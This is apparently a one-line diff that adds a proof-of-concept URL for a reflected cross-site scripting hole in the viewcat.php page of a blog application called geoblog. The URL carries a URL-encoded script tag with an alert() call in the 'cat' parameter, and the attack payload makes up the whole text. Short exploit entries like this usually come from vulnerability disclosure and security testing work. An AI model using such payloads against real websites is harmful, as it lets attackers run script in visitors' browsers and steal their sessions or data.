@@ -1,0 +1,1 @@
+http://www.example.com/[path to geoblog]/viewcat.php?cat=%3Cscript%3Ealert(&#039;xss-010704&#039;);%3C/script%3E
